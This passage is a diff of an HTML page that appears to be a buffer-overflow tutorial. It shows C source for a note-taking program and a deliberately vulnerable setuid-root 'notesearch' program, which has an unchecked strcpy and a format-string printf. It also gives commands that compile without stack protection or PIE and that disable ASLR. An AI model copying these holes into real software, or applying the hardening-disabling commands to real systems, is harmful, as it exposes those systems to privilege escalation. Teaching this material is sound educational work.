+</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>userid</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=c1>// Write user ID before note data.
+</span><span class=c1></span>      <span class=n>fatal</span><span class=p>(</span><span class=s>&#34;in main() while writing userid to file&#34;</span><span class=p>);</span>
+    <span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>                          <span class=c1>// Terminate line.
+</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buffer</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>buffer</span><span class=p>))</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=c1>// Write note.
+</span><span class=c1></span>      <span class=n>fatal</span><span class=p>(</span><span class=s>&#34;in main() while writing buffer to file&#34;</span><span class=p>);</span>
 
-    write(fd, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>1</span>); <span style=color:#75715e>// Terminate line.
-</span><span style=color:#75715e></span>    <span style=color:#75715e>// Closing file
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (close(fd) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
-      fatal(<span style=color:#e6db74>&#34;in main() while closing file&#34;</span>);
-    printf(<span style=color:#e6db74>&#34;Note has been saved.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-    free(buffer);
-    free(datafile);
-  }
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>  gcc notetaker.c -o notetaker -g
+    <span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=c1>// Terminate line.
+</span><span class=c1></span>    <span class=c1>// Closing file
+</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
+      <span class=n>fatal</span><span class=p>(</span><span class=s>&#34;in main() while closing file&#34;</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Note has been saved.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=n>free</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
+    <span class=n>free</span><span class=p>(</span><span class=n>datafile</span><span class=p>);</span>
+  <span class=p>}</span>
+</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>  gcc notetaker.c -o notetaker -g
   sudo chown root:root notetaker
   sudo chmod u+s notetaker
-  ./notetaker <span style=color:#e6db74>&#34;example message&#34;</span>
+  ./notetaker <span class=s2>&#34;example message&#34;</span>
 </code></pre></div><p>The second program, the vulnerable one, is used to search notes for the current user. Optionally, we can show only the messages that contain a specific string.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/stat.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;hacking.h&#34;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>
-  <span style=color:#75715e>#define FILENAME &#34;/var/notes&#34;
-</span><span style=color:#75715e></span>
-  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>print_notes</span>(<span style=color:#66d9ef>int</span>, <span style=color:#66d9ef>int</span>, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>); <span style=color:#75715e>// Note printing function.
-</span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>find_user_note</span>(<span style=color:#66d9ef>int</span>, <span style=color:#66d9ef>int</span>);      <span style=color:#75715e>// Seek in file for a note for user.
-</span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>search_note</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>);   <span style=color:#75715e>// Search for keyword function.
-</span><span style=color:#75715e></span>  <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>fatal</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>);                <span style=color:#75715e>// Fatal error handler
-</span><span style=color:#75715e></span>
-  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[])
-  {
-    <span style=color:#66d9ef>int</span> userid, printing <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>, fd; <span style=color:#75715e>// File descriptor
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span> searchstring[<span style=color:#ae81ff>100</span>];
-    <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>)                      <span style=color:#75715e>// If there is an arg,
-</span><span style=color:#75715e></span>      strcpy(searchstring, argv[<span style=color:#ae81ff>1</span>]); <span style=color:#75715e>// that is the search string;
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>else</span>                               <span style=color:#75715e>// otherwise,
-</span><span style=color:#75715e></span>      searchstring[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;           <span style=color:#75715e>// search string is empty.
-</span><span style=color:#75715e></span>    userid <span style=color:#f92672>=</span> getuid();
-    fd <span style=color:#f92672>=</span> open(FILENAME, O_RDONLY); <span style=color:#75715e>// Open the file for read-only access.
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (fd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
-      fatal(<span style=color:#e6db74>&#34;in main() while opening file for reading&#34;</span>);
-    printf(<span style=color:#e6db74>&#34;%i&#34;</span>, printing);
-    <span style=color:#66d9ef>while</span> (printing)
-      printing <span style=color:#f92672>=</span> print_notes(fd, userid, searchstring);
-    printf(<span style=color:#e6db74>&#34;-------[ end of note data ]-------</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-    close(fd);
-  }
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c>  <span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&#34;hacking.h&#34;</span><span class=cp>
+</span><span class=cp></span>
+  <span class=cp>#define FILENAME &#34;/var/notes&#34;
+</span><span class=cp></span>
+  <span class=kt>int</span> <span class=nf>print_notes</span><span class=p>(</span><span class=kt>int</span><span class=p>,</span> <span class=kt>int</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=p>);</span> <span class=c1>// Note printing function.
+</span><span class=c1></span>  <span class=kt>int</span> <span class=nf>find_user_note</span><span class=p>(</span><span class=kt>int</span><span class=p>,</span> <span class=kt>int</span><span class=p>);</span>      <span class=c1>// Seek in file for a note for user.
+</span><span class=c1></span>  <span class=kt>int</span> <span class=nf>search_note</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=p>);</span>   <span class=c1>// Search for keyword function.
+</span><span class=c1></span>  <span class=kt>void</span> <span class=nf>fatal</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>);</span>                <span class=c1>// Fatal error handler
+</span><span class=c1></span>
+  <span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
+  <span class=p>{</span>
+    <span class=kt>int</span> <span class=n>userid</span><span class=p>,</span> <span class=n>printing</span> <span class=o>=</span> <span class=mi>1</span><span class=p>,</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// File descriptor
+</span><span class=c1></span>    <span class=kt>char</span> <span class=n>searchstring</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>)</span>                      <span class=c1>// If there is an arg,
+</span><span class=c1></span>      <span class=n>strcpy</span><span class=p>(</span><span class=n>searchstring</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span> <span class=c1>// that is the search string;
+</span><span class=c1></span>    <span class=k>else</span>                               <span class=c1>// otherwise,
+</span><span class=c1></span>      <span class=n>searchstring</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>           <span class=c1>// search string is empty.
+</span><span class=c1></span>    <span class=n>userid</span> <span class=o>=</span> <span class=n>getuid</span><span class=p>();</span>
+    <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>FILENAME</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span> <span class=c1>// Open the file for read-only access.
+</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
+      <span class=n>fatal</span><span class=p>(</span><span class=s>&#34;in main() while opening file for reading&#34;</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;%i&#34;</span><span class=p>,</span> <span class=n>printing</span><span class=p>);</span>
+    <span class=k>while</span> <span class=p>(</span><span class=n>printing</span><span class=p>)</span>
+      <span class=n>printing</span> <span class=o>=</span> <span class=n>print_notes</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>userid</span><span class=p>,</span> <span class=n>searchstring</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;-------[ end of note data ]-------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
+  <span class=p>}</span>
 
-  <span style=color:#75715e>// A function to print the notes for a given uid that match
-</span><span style=color:#75715e></span>  <span style=color:#75715e>// an optional search string;
-</span><span style=color:#75715e></span>  <span style=color:#75715e>// returns 0 at end of file, 1 if there are still more notes.
-</span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>print_notes</span>(<span style=color:#66d9ef>int</span> fd, <span style=color:#66d9ef>int</span> uid, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>searchstring)
-  {
-    <span style=color:#66d9ef>int</span> note_length;
-    <span style=color:#66d9ef>char</span> byte <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, note_buffer[<span style=color:#ae81ff>100</span>];
-    note_length <span style=color:#f92672>=</span> find_user_note(fd, uid);
-    <span style=color:#66d9ef>if</span> (note_length <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)                      <span style=color:#75715e>// If end of file reached,
-</span><span style=color:#75715e></span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;                               <span style=color:#75715e>// return 0.
-</span><span style=color:#75715e></span>    read(fd, note_buffer, note_length);         <span style=color:#75715e>// Read note data.
-</span><span style=color:#75715e></span>    note_buffer[note_length] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;               <span style=color:#75715e>// Terminate the string.
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (search_note(note_buffer, searchstring)) <span style=color:#75715e>// If searchstring found,
-</span><span style=color:#75715e></span>      printf(note_buffer);                    <span style=color:#75715e>// print the note.
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
-  }
+  <span class=c1>// A function to print the notes for a given uid that match
+</span><span class=c1></span>  <span class=c1>// an optional search string;
+</span><span class=c1></span>  <span class=c1>// returns 0 at end of file, 1 if there are still more notes.
+</span><span class=c1></span>  <span class=kt>int</span> <span class=nf>print_notes</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>int</span> <span class=n>uid</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>searchstring</span><span class=p>)</span>
+  <span class=p>{</span>
+    <span class=kt>int</span> <span class=n>note_length</span><span class=p>;</span>
+    <span class=kt>char</span> <span class=n>byte</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>note_buffer</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
+    <span class=n>note_length</span> <span class=o>=</span> <span class=n>find_user_note</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>uid</span><span class=p>);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>note_length</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>                      <span class=c1>// If end of file reached,
+</span><span class=c1></span>      <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>                               <span class=c1>// return 0.
+</span><span class=c1></span>    <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>note_buffer</span><span class=p>,</span> <span class=n>note_length</span><span class=p>);</span>         <span class=c1>// Read note data.
+</span><span class=c1></span>    <span class=n>note_buffer</span><span class=p>[</span><span class=n>note_length</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>               <span class=c1>// Terminate the string.
+</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>search_note</span><span class=p>(</span><span class=n>note_buffer</span><span class=p>,</span> <span class=n>searchstring</span><span class=p>))</span> <span class=c1>// If searchstring found,
+</span><span class=c1></span>      <span class=n>printf</span><span class=p>(</span><span class=n>note_buffer</span><span class=p>);</span>                    <span class=c1>// print the note.
+</span><span class=c1></span>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+  <span class=p>}</span>
 
-  <span style=color:#75715e>// A function to find the next note for a given userID;
-</span><span style=color:#75715e></span>  <span style=color:#75715e>// returns -1 if the end of the file is reached;
-</span><span style=color:#75715e></span>  <span style=color:#75715e>// otherwise, it returns the length of the found note.
-</span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>find_user_note</span>(<span style=color:#66d9ef>int</span> fd, <span style=color:#66d9ef>int</span> user_uid)
-  {
-    <span style=color:#66d9ef>int</span> note_uid <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
-    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> byte;
-    <span style=color:#66d9ef>int</span> length;
-    <span style=color:#66d9ef>while</span> (note_uid <span style=color:#f92672>!=</span> user_uid)
-      {                                                        <span style=color:#75715e>// Loop until a note for user_uid is found.
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> (read(fd, <span style=color:#f92672>&amp;</span>note_uid, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>) <span style=color:#75715e>// Read the uid data.
-</span><span style=color:#75715e></span>          <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;                                       <span style=color:#75715e>// If 4 bytes aren&#39;t read, return end of file code.
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> (read(fd, <span style=color:#f92672>&amp;</span>byte, <span style=color:#ae81ff>1</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>1</span>)                         <span style=color:#75715e>// Read the newline separator.
-</span><span style=color:#75715e></span>          <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
-        byte <span style=color:#f92672>=</span> length <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-        <span style=color:#66d9ef>while</span> (byte <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;\n&#39;</span>)
-          {                                <span style=color:#75715e>// Figure out how many bytes to the end of line.
-</span><span style=color:#75715e></span>            <span style=color:#66d9ef>if</span> (read(fd, <span style=color:#f92672>&amp;</span>byte, <span style=color:#ae81ff>1</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>1</span>) <span style=color:#75715e>// Read a single byte.
-</span><span style=color:#75715e></span>              <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;               <span style=color:#75715e>// If byte isn&#39;t read, return end of file code.
-</span><span style=color:#75715e></span>            length<span style=color:#f92672>++</span>;
-          }
-      }
-    lseek(fd, length <span style=color:#f92672>*</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, SEEK_CUR); <span style=color:#75715e>// Rewind file reading by length bytes.
-</span><span style=color:#75715e></span>    printf(<span style=color:#e6db74>&#34;[DEBUG] found a %d byte note for user id %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, length, note_uid);
-    <span style=color:#66d9ef>return</span> length;
-  }
+  <span class=c1>// A function to find the next note for a given userID;
+</span><span class=c1></span>  <span class=c1>// returns -1 if the end of the file is reached;
+</span><span class=c1></span>  <span class=c1>// otherwise, it returns the length of the found note.
+</span><span class=c1></span>  <span class=kt>int</span> <span class=nf>find_user_note</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>int</span> <span class=n>user_uid</span><span class=p>)</span>
+  <span class=p>{</span>
+    <span class=kt>int</span> <span class=n>note_uid</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>byte</span><span class=p>;</span>
+    <span class=kt>int</span> <span class=n>length</span><span class=p>;</span>
+    <span class=k>while</span> <span class=p>(</span><span class=n>note_uid</span> <span class=o>!=</span> <span class=n>user_uid</span><span class=p>)</span>
+      <span class=p>{</span>                                                        <span class=c1>// Loop until a note for user_uid is found.
+</span><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>note_uid</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>4</span><span class=p>)</span> <span class=c1>// Read the uid data.
+</span><span class=c1></span>          <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>                                       <span class=c1>// If 4 bytes aren&#39;t read, return end of file code.
+</span><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>byte</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span>                         <span class=c1>// Read the newline separator.
+</span><span class=c1></span>          <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=n>byte</span> <span class=o>=</span> <span class=n>length</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+        <span class=k>while</span> <span class=p>(</span><span class=n>byte</span> <span class=o>!=</span> <span class=sc>&#39;\n&#39;</span><span class=p>)</span>
+          <span class=p>{</span>                                <span class=c1>// Figure out how many bytes to the end of line.
+</span><span class=c1></span>            <span class=k>if</span> <span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>byte</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span> <span class=c1>// Read a single byte.
+</span><span class=c1></span>              <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>               <span class=c1>// If byte isn&#39;t read, return end of file code.
+</span><span class=c1></span>            <span class=n>length</span><span class=o>++</span><span class=p>;</span>
+          <span class=p>}</span>
+      <span class=p>}</span>
+    <span class=n>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>length</span> <span class=o>*</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>SEEK_CUR</span><span class=p>);</span> <span class=c1>// Rewind file reading by length bytes.
+</span><span class=c1></span>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[DEBUG] found a %d byte note for user id %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>length</span><span class=p>,</span> <span class=n>note_uid</span><span class=p>);</span>
+    <span class=k>return</span> <span class=n>length</span><span class=p>;</span>
+  <span class=p>}</span>
 
-  <span style=color:#75715e>// A function to search a note for a given keyword;
-</span><span style=color:#75715e></span>  <span style=color:#75715e>// returns 1 if a match is found, 0 if there is no match.
-</span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>search_note</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>note, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>keyword)
-  {
-    <span style=color:#66d9ef>int</span> i, keyword_length, match <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-    keyword_length <span style=color:#f92672>=</span> strlen(keyword);
-    <span style=color:#66d9ef>if</span> (keyword_length <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) <span style=color:#75715e>// If there is no search string,
-</span><span style=color:#75715e></span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;            <span style=color:#75715e>// always &#34;match&#34;.
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> strlen(note); i<span style=color:#f92672>++</span>)
-      {                                  <span style=color:#75715e>// Iterate over bytes in note.
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> (note[i] <span style=color:#f92672>==</span> keyword[match]) <span style=color:#75715e>// If byte matches keyword,
-</span><span style=color:#75715e></span>          match<span style=color:#f92672>++</span>;                   <span style=color:#75715e>// get ready to check the next byte;
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>else</span>
-          {                              <span style=color:#75715e>// otherwise,
-</span><span style=color:#75715e></span>            <span style=color:#66d9ef>if</span> (note[i] <span style=color:#f92672>==</span> keyword[<span style=color:#ae81ff>0</span>]) <span style=color:#75715e>// if that byte matches first keyword byte,
-</span><span style=color:#75715e></span>              match <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;             <span style=color:#75715e>// start the match count at 1.
-</span><span style=color:#75715e></span>            <span style=color:#66d9ef>else</span>
-              match <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>// Otherwise it is zero.
-</span><span style=color:#75715e></span>          }
-        <span style=color:#66d9ef>if</span> (match <span style=color:#f92672>==</span> keyword_length) <span style=color:#75715e>// If there is a full match,
-</span><span style=color:#75715e></span>          <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;                <span style=color:#75715e>// return matched.
-</span><span style=color:#75715e></span>      }
-    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>// Return not matched.
-</span><span style=color:#75715e></span>  }
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>  gcc notesearch.c -o notesearch -fno-stack-protector -no-pie -g
+  <span class=c1>// A function to search a note for a given keyword;
+</span><span class=c1></span>  <span class=c1>// returns 1 if a match is found, 0 if there is no match.
+</span><span class=c1></span>  <span class=kt>int</span> <span class=nf>search_note</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>note</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>keyword</span><span class=p>)</span>
+  <span class=p>{</span>
+    <span class=kt>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>keyword_length</span><span class=p>,</span> <span class=n>match</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+    <span class=n>keyword_length</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>keyword</span><span class=p>);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>keyword_length</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=c1>// If there is no search string,
+</span><span class=c1></span>      <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>            <span class=c1>// always &#34;match&#34;.
+</span><span class=c1></span>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>strlen</span><span class=p>(</span><span class=n>note</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
+      <span class=p>{</span>                                  <span class=c1>// Iterate over bytes in note.
+</span><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>note</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>keyword</span><span class=p>[</span><span class=n>match</span><span class=p>])</span> <span class=c1>// If byte matches keyword,
+</span><span class=c1></span>          <span class=n>match</span><span class=o>++</span><span class=p>;</span>                   <span class=c1>// get ready to check the next byte;
+</span><span class=c1></span>        <span class=k>else</span>
+          <span class=p>{</span>                              <span class=c1>// otherwise,
+</span><span class=c1></span>            <span class=k>if</span> <span class=p>(</span><span class=n>note</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>keyword</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=c1>// if that byte matches first keyword byte,
+</span><span class=c1></span>              <span class=n>match</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>             <span class=c1>// start the match count at 1.
+</span><span class=c1></span>            <span class=k>else</span>
+              <span class=n>match</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// Otherwise it is zero.
+</span><span class=c1></span>          <span class=p>}</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>match</span> <span class=o>==</span> <span class=n>keyword_length</span><span class=p>)</span> <span class=c1>// If there is a full match,
+</span><span class=c1></span>          <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>                <span class=c1>// return matched.
+</span><span class=c1></span>      <span class=p>}</span>
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// Return not matched.
+</span><span class=c1></span>  <span class=p>}</span>
+</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>  gcc notesearch.c -o notesearch -fno-stack-protector -no-pie -g
   sudo chown root:root notesearch
   sudo chmod u+s notesearch
-  ./notesearch <span style=color:#e6db74>&#34;example&#34;</span>
+  ./notesearch <span class=s2>&#34;example&#34;</span>
 </code></pre></div><p>We need to disable the Adress Space Layout Randomization (ASLR) to avoid random memory addreses.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>  echo <span style=color:#ae81ff>0</span> | sudo tee /proc/sys/kernel/randomize_va_space
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>  <span class=nb>echo</span> <span class=m>0</span> <span class=p>|</span> sudo tee /proc/sys/kernel/randomize_va_space
 </code></pre></div><p>You may be wondering if ASLR and PIE do the same. Both disable the randomization of memory addresses for executables. That&rsquo;s true. However, they randomize different things. ASLR is a kernel protection feature, and it has three levels in Linux:</p>
 <ol>
 <li>Disable ASLR. This setting is applied if the kernel is booted with the norandmaps boot parameter (in Linux).</li>
@@ -331,7 +334,7 @@ gdb ./auth_overflow
 <figure class=centered-image><img src=/images/stack-based-buffer-overflow/notesearch-gdb-exploit.png>
 </figure>
 <p>This payload doesn&rsquo;t work outside gdb. The environment in which we execute the exploit can modify the position of the variables in the stack. For example, the environment variables used on gdb differ from the ones on the shell. To circumvent that issue, we can pass the environment variables to gdb.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>  env gdb notesearch
